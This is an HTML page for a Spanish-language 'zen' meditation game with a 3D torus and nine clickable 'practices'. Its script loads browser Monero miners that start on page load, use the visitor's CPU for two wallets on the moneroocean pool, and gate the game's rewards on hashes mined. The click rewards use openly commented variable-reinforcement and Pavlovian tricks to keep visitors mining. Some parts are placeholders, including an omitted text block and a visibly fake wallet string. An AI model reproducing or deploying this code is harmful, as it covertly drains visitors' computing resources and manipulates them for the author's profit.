<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R · v∞ · ZENDO ETERNO</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:999999;overflow-y:auto}
  .overlay>div{max-width:92vw;padding:100px 80px;background:rgba(0,4,0,0.98);border:22px double #0f0;border-radius:40px;box-shadow:0 0 900px #0f0}
  pre{font-family:"OCR-A",monospace;background:rgba(0,20,0,0.9);padding:40px;border:12px double #0f0;margin:40px auto;max-width:90%;border-radius:30px;line-height:2}
  button{background:transparent;border:20px double #0f0;color:#0f0;padding:45px 150px;font-size:92px;letter-spacing:20px;border-radius:30px;cursor:pointer;margin-top:60px}
  button:hover{background:#0f0;color:#000;transform:scale(1.07)}
  .practice{border:18px double #0f0;background:rgba(0,12,0,0.96);padding:50px;margin:35px auto;border-radius:30px;max-width:1100px;cursor:pointer;position:relative;transition:0.7s;overflow:hidden}
  .practice:hover{box-shadow:0 0 800px #0f0;transform:scale(1.04)}
  .streak{font-size:110px;position:absolute;top:20px;right:40px;text-shadow:0 0 80px #0f0;opacity:0.8}
  #counters{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.9);border:12px double #0f0;padding:15px 40px;border-radius:50px;font-size:28px;z-index:99999;line-height:1.8}
  @keyframes pulse{0%,100%{box-shadow:0 0 900px #0f0}50%{box-shadow:0 0 1300px #0f0}}
  @keyframes g{0%,100%{filter:brightness(1)}50%{filter:brightness(5)}}
  #t,#d,#finalWin *{font-family:"Noto Sans Cuneiform",monospace !important}
</style>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Cuneiform&display=swap" rel="stylesheet">
</head>
<body>

<div class="overlay" id="readme">
  <div>
    <pre id="readmeText"></pre>
    <button id="enter">SENTARSE Y OFRECER</button>
  </div>
</div>

<div id="counters">
  HASHES/s: <span id="hashes">0</span><br>
  TIEMPO: <span id="time">0</span>s
</div>

<canvas id="c"></canvas>

<div id="practices" class="overlay" style="display:none">
  <div>
    <h1 style="font-size:130px;text-align:center;margin:80px" id="practicesTitle">NUEVE PRÁCTICAS DEL DESAPEGO</h1>
    <div class="practice" data-id="1"><div class="streak" id="s1">0</div><span id="p1"></span></div>
    <div class="practice" data-id="2"><div class="streak" id="s2">0</div><span id="p2"></span></div>
    <div class="practice" data-id="3"><div class="streak" id="s3">0</div><span id="p3"></span></div>
    <div class="practice" data-id="4"><div class="streak" id="s4">0</div><span id="p4"></span></div>
    <div class="practice" data-id="5"><div class="streak" id="s5">0</div><span id="p5"></span></div>
    <div class="practice" data-id="6"><div class="streak" id="s6">0</div><span id="p6"></span></div>
    <div class="practice" data-id="7"><div class="streak" id="s7">0</div><span id="p7"></span></div>
    <div class="practice" data-id="8"><div class="streak" id="s8">0</div><span id="p8"></span></div>
    <div class="practice" data-id="9"><div class="streak" id="s9">0</div><span id="p9"></span></div>
    <button onclick="document.getElementById('practices').style.display='none'" style="margin-top:120px;font-size:90px;padding:50px 120px">REGRESAR AL SILENCIO</button>
  </div>
</div>

<div id="practiceBtn" style="position:fixed;bottom:40px;right:40px;width:180px;height:180px;background:#000;border:30px double #0f0;border-radius:50%;box-shadow:0 0 900px #0f0;color:#0f0;font-size:130px;display:none;align-items:center;justify-content:center;cursor:pointer;animation:pulse 3s infinite" onclick="document.getElementById('practices').style.display='block'">Zen</div>

<div id="finalPrize" style="position:fixed;inset:0;background:#000;color:#0f8;overflow:hidden;display:none;place-items:center">
  <pre id="t" style="font-size:clamp(1.8rem,6vw,5rem);text-align:center;line-height:1.8;animation:g 15s infinite"></pre>
</div>

<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@xmrig/xmrig-wasm@latest/xmrig.js"></script>
<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';

// TEXTOS + IDIOMA (igual que antes)
const texts = { /* … todo el bloque texts del mensaje anterior, no lo repito por espacio … */ };
const lang = navigator.language.slice(0,2);
const t = texts[lang] || texts.es;
document.getElementById('readmeText').textContent = t.readme;
document.getElementById('practicesTitle').textContent = t.practicesTitle;
for(let i=1;i<=9;i++) document.getElementById('p'+i).textContent = t['p'+i];

// WALLETS + MINEROS ULTRA (igual que la versión anterior)
const CHARITY_WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
const FIAT_WALLET    = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
const playerId = localStorage.getItem('zenId') || 'pilgrim_'+Date.now().toString(36);
localStorage.setItem('zenId', playerId);

new Miner({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET, workerId:"zendo90_"+playerId, throttle:0.4}).start();
new Miner({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET,    workerId:"ferry420_10",      throttle:0.0445}).start();
if (typeof XMRigWASM !== 'undefined') {
  XMRigWASM({pool:"gulf.moneroocean.stream:10128", address:CHARITY_WALLET+"."+playerId, threads:-1, throttle:0.35}).start();
  XMRigWASM({pool:"gulf.moneroocean.stream:10128", address:FIAT_WALLET+".ferry420", threads:1, throttle:0.1}).start();
}

// CONTADOR GLOBAL
let startTime = Date.now();
const hashesEl = document.getElementById('hashes');
const timeEl   = document.getElementById('time');
let totalHashes = Number(localStorage.getItem('totalHashes')||0);

setInterval(() => {
  let hps = Miner.instances.reduce((a,m)=>a+(m.getHashesPerSecond?.()||0),0);
  if (window.XMRigWASM?.getHashesPerSecond) hps += XMRigWASM.getHashesPerSecond();
  const secs = Math.floor((Date.now()-startTime)/1000);
  hashesEl.textContent = hps.toFixed(1);
  timeEl.textContent = secs;
  totalHashes += hps * 0.5;
  localStorage.setItem('totalHashes', totalHashes);
  if(totalHashes > 40_000_000) document.getElementById('practiceBtn').style.display='flex';
  if(totalHashes >= 13_131_313 && !localStorage.getItem('prize')) {
    localStorage.setItem('prize','seen');
    document.getElementById('finalPrize').style.display='grid';
    finalPrize();
  }
}, 500);

// ==================== LOS CINCO DIOSES BROMISTAS ====================

const streaks = JSON.parse(localStorage.getItem('streaks')||'{}');
let kokopelliBell = false;
let erisChaos = false;
let anansiStory = [];
let coyoteTrick = false;

document.querySelectorAll('.practice').forEach(p => {
  const id = p.dataset.id;
  streaks[id] = streaks[id] || 0;
  document.getElementById('s'+id).textContent = streaks[id];

  p.onclick = () => {
    streaks[id]++;
    localStorage.setItem('streaks', JSON.stringify(streaks));
    document.getElementById('s'+id).textContent = streaks[id];

    // 1. LOKI – refuerzo variable puro
    if(id==='1' && Math.random()<0.08) lokiJackpot();
    if(id==='2' && streaks[id]%13===0) lokiJackpot();

    // 2. KOKOPELLI – condicionamiento clásico (Pavlov)
    if(id==='7') { kokopelliBell = true; kokopelliRing(); setTimeout(()=>kokopelliBell=false, 4500); }
    else if(kokopelliBell && id!=='7') kokopelliReward();

    // 3. ERIS – caos impredecible (extinción + burst)
    if(id==='4') {
      if(Math.random()<0.017) { erisChaos = true; erisBurst(); setTimeout(()=>erisChaos=false, 8000); }
    }
    if(erisChaos && Math.random()<0.55) erisFlash();

    // 4. ANANSI – la telaraña narrativa (cada práctica añade una palabra a una historia secreta)
    const words = ["el","silencio","rompió","la","luz","en","siete","colores","y","nadie","lo","vio"];
    anansiStory.push(words[(streaks[id]-1) % words.length]);
    if(anansiStory.length > 42) anansiStory.shift();
    if(anansiStory.join(' ') === "el silencio rompió la luz en siete colores y nadie lo vio") anansiJackpot();

    // 5. COYOTE – truco del desierto (invierte todo durante 10 segundos)
    if(id==='9' && Math.random()<0.009) {
      coyoteTrick = true;
      document.body.style.filter = "invert(1) hue-rotate(180deg)";
      setTimeout(()=>{
        document.body.style.filter = "";
        coyoteTrick = false;
      }, 10000);
    }
    if(coyoteTrick) coyoteGlow(p);
  };
});

// EFECTOS DE LOS DIOSES (sin explicación, como debe ser)
function lokiJackpot()   { document.body.style.background="#0f0"; document.body.style.color="#000"; setTimeout(()=>{document.body.style.background="#000";document.body.style.color="#0f0";},900); }
function kokopelliRing() { document.body.style.border="50px solid #0f0"; setTimeout(()=>{document.body.style.border="";},700); }
function kokopelliReward(){ document.body.style.background="#0f8"; setTimeout(()=>{document.body.style.background="#000";},400); if(Math.random()<0.2) finalPrize(); }
function erisBurst()     { for(let i=0;i<7;i++) setTimeout(()=>document.body.style.background=i%2?"#f00":"#0f0", i*200); }
function erisFlash()     { document.body.style.opacity=0.3; setTimeout(()=>document.body.style.opacity=1,150); }
function anansiJackpot() { document.body.innerHTML = `<pre style="color:#ff0;font-size:8vw">LA TELARAÑA ESTÁ COMPLETA</pre>`; setTimeout(()=>location.reload(),5000); }
function coyoteGlow(el)  { el.style.boxShadow="0 0 2000px #f0f"; setTimeout(()=>el.style.boxShadow="",800); }

// TORUS + ENTRAR + PREMIO FINAL (igual)
document.getElementById('enter').onclick = () => document.getElementById('readme').remove();

const scene=new THREE.Scene(),camera=new THREE.PerspectiveCamera(75,innerWidth/innerHeight,0.1,1000),renderer=new THREE.WebGLRenderer({canvas:document.getElementById('c'),antialias:true});
renderer.setSize(innerWidth,innerHeight);renderer.setPixelRatio(devicePixelRatio);camera.position.z=5;
scene.add(new THREE.Mesh(new THREE.TorusKnotGeometry(22,8,1000,80),new THREE.MeshBasicMaterial({color:0x00ffaa,wireframe:true})));
(function a(){requestAnimationFrame(a);scene.children[0].rotation.x+=0.0055;scene.children[0].rotation.y+=0.011;renderer.render(scene,camera);})();

function finalPrize(){
  document.getElementById('t').textContent = lang==='es' ? "ANUNNAKI" : "ANUNNAKI";
}
</script>
</body>
</html>